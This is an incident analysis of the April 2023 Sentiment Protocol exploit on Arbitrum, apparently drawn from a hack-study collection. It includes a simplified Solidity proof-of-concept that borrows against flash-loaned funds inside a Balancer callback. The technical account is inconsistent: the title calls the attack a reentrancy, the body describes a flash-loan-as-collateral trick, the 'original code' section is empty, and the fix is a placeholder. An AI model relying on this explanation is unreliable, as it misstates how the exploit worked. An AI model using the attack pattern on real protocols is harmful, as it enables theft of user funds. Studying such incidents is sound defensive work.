# Sentiment Protocol — Balancer Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-09 |
| **Protocol** | Sentiment Protocol |
| **Chain** | Arbitrum |
| **Loss** | ~1M USD |
| **Attacker** | Unknown |
| **Attack Tx** | Arbitrum Transaction |
| **Vulnerable Contract** | Sentiment lending account contract |
| **Root Cause** | No account health check performed during external callback execution, allowing excessive borrowing immediately after collateral registration |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Sentiment_exp.sol) |

---
## 1. Vulnerability Overview

Sentiment is a lending protocol based on DeFi positions. During receipt of a Balancer flash loan, it was possible to manipulate a Sentiment account's assets inside the `receiveFlashLoan()` callback. In the state prior to flash loan repayment, the account appeared to hold sufficient collateral, enabling additional borrowing.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Sentiment lending account
// Account state can be manipulated during Balancer flash loan callback
function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    // Manipulate Sentiment account inside the callback
    // Exploit the temporary presence of flash loan funds in the account

    // ❌ Borrow executed without health check
    sentimentAccount.exec(token, borrowCalldata);
    // Flash loan funds are recognized as collateral
}

// ✅ Fix: Lock account during flash loan execution
function exec(address token, bytes calldata data) external {
    require(!flashLoanActive, "Flash loan in progress");
    // ...
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: No account health check performed during external callback execution,
// allowing excessive borrowing immediately after collateral registration
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Balancer flash loan → receiveFlashLoan callback → borrow additional funds using flash loan as collateral →
withdraw assets before callback ends → repay flash loan → net profit from borrowed funds
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory,
    bytes memory
) external {
    // 1. Transfer flash loan funds into the Sentiment account
    tokens[0].transfer(address(sentimentAccount), amounts[0]);

    // 2. Borrow additional funds while flash loan funds are recognized as collateral
    sentimentAccount.borrow(borrowToken, borrowAmount);

    // 3. Withdraw the borrowed funds
    sentimentAccount.withdraw(borrowToken, address(this));

    // 4. Repay the flash loan (collateral is now removed)
    tokens[0].transfer(address(balancerVault), amounts[0]);
    // Borrowed funds remain → net profit
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash loan callback state manipulation |
| **Attack Vector** | Balancer Flash Loan + account state bypass |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-362: Race Condition |

## 6. Remediation Recommendations
Lock the account during flash loan execution, perform health checks before and after the flash loan callback, and restrict state changes within the callback.

## 7. Lessons Learned
Balancer's fee-free flash loans are an extremely useful tool for attackers. All pathways that allow protocol state manipulation during a flash loan callback must be blocked.